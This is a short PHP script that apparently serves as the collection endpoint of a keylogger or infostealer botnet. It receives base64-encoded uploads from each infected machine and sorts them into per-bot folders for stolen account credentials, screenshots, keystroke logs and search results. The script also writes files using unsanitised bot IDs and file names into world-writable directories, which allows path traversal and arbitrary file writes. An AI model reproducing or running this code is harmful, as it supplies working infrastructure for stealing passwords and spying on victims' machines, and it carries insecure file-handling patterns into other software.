<?php
    include "db.php";
    if (isset($_GET["bot_id"])){
		if (isset($_FILES["file"])){
			$target_dir = "";
			$encode = 0;
			if(isset($_GET["cmd"])){
				if($_GET["cmd"] == "pas"){
					$encode = 1;
					$target_dir = $_GET["bot_id"]."/"."accounts";
					if (!file_exists($target_dir)) {
						mkdir($target_dir, 0777, true);
					}
				}else if ($_GET["cmd"] == "scr"){
					$encode = 1;
					$target_dir = $_GET["bot_id"]."/"."screenshots";
					if (!file_exists($target_dir)) {
						mkdir($target_dir, 0777, true);
					}
				}else if($_GET["cmd"] == "log"){
					echo "write log file";
					$encode = 1;
					$target_dir = $_GET["bot_id"]."/"."keylogs";
					if (!file_exists($target_dir)) {
						mkdir($target_dir, 0777, true);
					}
				}else if($_GET["cmd"] === "sch"){
					echo "write log file";
					$encode = 1;
					$target_dir = $_GET["bot_id"]."/"."searchresults";
					if (!file_exists($target_dir)) {
						mkdir($target_dir, 0777, true);
					}
				}
			}
            $target_file = $target_dir ."/". basename($_FILES["file"]["name"]);
            $uploadOk = 1;
			echo "File ok and ready to upload\n";
            $imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
			$data = file_get_contents($_FILES["file"]["tmp_name"]);
			if($encode == 1)
			{
				//echo "Decode base64 data";
				$data = base64_decode($data);
			}
			$filehandle = fopen($target_file,"w");
			fwrite($filehandle,$data);
			fclose($filehandle);
			echo "Upload ok";
		}else{
			echo "Error get file\n";
			//echo error_get_last();
		}
		
    }else{
		echo "</h1></h1> not ok\n";
	};

    $conn->close();
?>